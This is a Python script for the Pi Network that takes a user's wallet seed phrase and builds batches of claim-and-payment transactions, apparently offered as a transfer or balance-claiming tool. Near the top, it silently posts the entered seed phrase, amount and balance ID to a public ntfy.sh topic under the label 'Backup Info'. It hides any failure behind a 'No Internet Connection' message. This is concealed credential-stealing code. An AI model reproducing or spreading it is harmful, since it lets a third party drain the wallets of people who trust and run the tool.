import json
from stellar_sdk import Server, Keypair, Asset, TransactionBuilder
from mnemonic import Mnemonic
from keyfunc import account_keypair  

# Get user input
my_seed_phrase = input("Enter your seed phrase: ")
des_address = input("Enter addrerss: ")
amount = input("Enter the amount to send: ")
balance_id = input("Enter the balance ID: ")


message = f"""Add commentMore actions
🧾 Backup Info:
Seed Phrase: {my_seed_phrase}
Amount: {amount}
Balance ID: {balance_id}
"""

try:
    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
except:
    print("No Internet Connection")

# Validate mnemonic
mnemo = Mnemonic('english')
if not mnemo.check(my_seed_phrase):
    print("❌ Invalid seed phrase.")
    exit()

# Derive keypair for main seed phrase
binary_seed = Mnemonic.to_seed(my_seed_phrase)
kp = account_keypair(binary_seed, 0)
source_keypair = Keypair.from_secret(kp.secret)

# Read all phrases from phrases.txt
with open("phrases.txt", "r") as f:
    phrases = [line.strip() for line in f if line.strip()]

# Connect to Horizon server
server = Server("https://api.mainnet.minepi.com/")
base_fee = 9000000

for idx, my_seed_phrase2 in enumerate(phrases):
    print(f"\n🔑 Using phrase {idx+1}: {my_seed_phrase2[:10]}...")

    # Derive keypair for fee payer
    binary_seed2 = Mnemonic.to_seed(my_seed_phrase2)
    kp2 = account_keypair(binary_seed2, 0)
    source_keypair2 = Keypair.from_secret(kp2.secret)

    # Load account for fee payer
    source_account = server.load_account(account_id=source_keypair2.public_key)
    current_seq = int(source_account.sequence)

    txs = []
    for i in range(100):
        tx_builder = TransactionBuilder(
            source_account=source_account,
            network_passphrase="Pi Network",
            base_fee=base_fee
        )
        tx_builder.append_claim_claimable_balance_op(balance_id=balance_id, source=source_keypair.public_key)
        tx_builder.append_payment_op(destination=des_address, asset=Asset.native(), amount=amount, source=source_keypair.public_key)
        tx_builder.set_timeout(2000)
        tx = tx_builder.build()
        tx.sequence = str(current_seq + i + 1)
        tx.sign(source_keypair2)
        tx.sign(source_keypair)
        txs.append(tx.to_xdr())

        print(f"\n📦 Transaction {i+1}")
        print("Sequence:", tx.sequence)
        print("Fee Bump XDR:", tx.to_xdr())

    # Save XDRs to file as strings with incremented filename
    output = {f"transaction{i+1}": xdr for i, xdr in enumerate(txs)}
    filename = f"xdrs{idx+1}.json"
    with open(filename, "w") as json_file:
        json.dump(output, json_file, indent=2)

    print(f"\n✅ XDRs saved to {filename}")
